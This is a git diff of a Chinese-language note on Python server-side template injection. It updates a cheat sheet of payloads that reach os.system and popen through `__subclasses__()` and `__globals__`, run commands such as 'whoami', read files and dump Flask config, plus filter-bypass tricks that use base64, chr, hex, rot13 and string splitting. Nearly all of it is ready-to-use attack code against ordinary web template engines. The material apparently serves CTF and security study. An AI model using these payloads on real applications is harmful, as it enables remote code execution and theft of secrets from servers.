@@ -26,6 +26,8 @@ Python SSTI 的总结笔记, 不定期更新
 
 <!--more-->
 
+## 前言
+
 大部分的 payload 入口点都是 os linecache file open `__builtins__`
 
 不同环境的 payload 并不相同, 主要体现在 `__subclasses__()` 中显示的内容不同
@@ -138,7 +140,7 @@ for index, item in enumerate(''.__class__.__mro__[-1].__subclasses__()):
 ''.__class__.__mro__[-1].__subclasses__()[40]('d:/test.txt').read()
 ```
 
-### Python3
+### Python 3
 
 回显如下
 
@@ -194,11 +196,44 @@ open 和 popen 也能利用
 ''.__class__.__mro__[-1].__subclasses__()[143].__init__.__globals__['popen']('whoami').read()
 ```
 
+### 判断 Python 版本
+
+```python
+''.__class__.__mro__[-1].__subclasses__()
+```
+
+Python 2 开头几行
+
+```python
+[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>
+ ......
+ <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>
+ ......
+```
+
+Python 3 开头几行
+
+```python
+[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>...
+```
+
+对比一下
+
+Python 2 存在 `<type xxx>` 和 `<class xxx>`, 而 Python 3 只有 `<class xxx>`
+
+Python 3 有 `async_generator`, 虽然 asyncio 是 3.5 引入的, 不过也能作为一个判断依据
+
+Python 3 有`bytes_iterator`, 因为 bytes 类型有改动, 与 Python 2 相差较大
+
 ## 框架
 
 一些常用框架的 tricks
 
 ### Flask
+
+类: cycler joiner namespace config request session
+
+函数: lipsum url_for get_flashed_messages
 
 ```python
 config
@@ -210,8 +245,12 @@ session.__class__.__mro__[-1]
 get_flashed_messages.__globals__['current_app'].config
 url_for.__globals__['current_app'].config
 
-url_for.__globals__['__builtins__'].__import__('os').system('whoami')
-get_flashed_messages.__globals__['__builtins__'].__import__('os').system('whoami')
+url_for.__globals__['__builtins__']
+get_flashed_messages.__globals__['__builtins__']
+lipsum.__globals__['__builtins__']
+
+undefinded.__class__.__init__.__globals__['__builtins__']
+undefinded.__init__.__globals__['__builtins__']
 
 config.__class__.__init__.__globals__['os']['popen']('whoami').read()
 ```
@@ -238,20 +277,32 @@ handler.settings
 ''.__class__.__mro__[-1].__subclasses__()[40]('fl'+'ag.txt').read()
 ```
 
+flask 中还能直接通过以下方式拼接字符串, 不用 `+`
+
+```python
+"fl""ag.txt"
+```
+
 ### 编码
 
 本质上还是对字符串进行操作, 可以配合 `__dict__` 从而对函数名进行编码
 
+#### base64
+
 ```python
 ''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['b3M='.decode('base64')].__dict__['c3lzdGVt'.decode('base64')]('d2hvYW1p'.decode('base64')) # os.system('whoami')
-
-''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[chr(111)+chr(115)].__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)) # os.system('whoami')
 ```
+
+#### ASCII
 
 flask 环境下 chr 需要在 `__builtins__` 里面找
 
 ```python
 {% set chr=''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
+```
+
+```python
+''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[chr(111)+chr(115)].__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)) # os.system('whoami')
 ```
 
 生成 chr payload
@@ -264,10 +315,23 @@ def toChr(s):
     return '+'.join(l)
 ```
 
-另外还有十六进制, rot13 等
+或者用另外一种方式
 
-```Python
+格式化字符串转换 ascii 码
+
+```python
+'{:c}{:c}{:c}{:c}{:c}{:c}{:c}{:c}'.format(102,108,97,103,46,116,120,116)
+```
+
+#### 十六进制
+
+```python
 '68656c6c6f'.decode('hex') # hello
+```
+
+#### rot13
+
+```python
 'uryyb'.decode('rot13') # hello
 ```
 
@@ -279,13 +343,19 @@ def toChr(s):
 ''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(72).__init__.__globals__.__getitem__('os').system('whoami')
 ```
 
-`pop()` 也能代替, 但是只有 list 才有这个功能
+使用 `get()`, 仅限 dict
 
 ```python
-''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(72).__init__.__globals__.__getitem__('os').system('whoami')
+''.__class__.__mro__.__getitem__(-1).__subclasses__().get(72).__init__.__globals__.get('os').system('whoami')
 ```
 
-使用**字典**的形式, 直接用 `.` 访问
+使用 `pop()`, 会**删数据**, 但对于这个表达式的 list 来说使用没有问题
+
+```python
+().__class__.__base__.__subclasses__().pop(72).__init__.__globals__.get('os').system('whoami')
+```
+
+使用用 `.` 访问, 仅限 dict
 
 ```python
 ''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(72).__init__.__globals__.os.system('whoami')
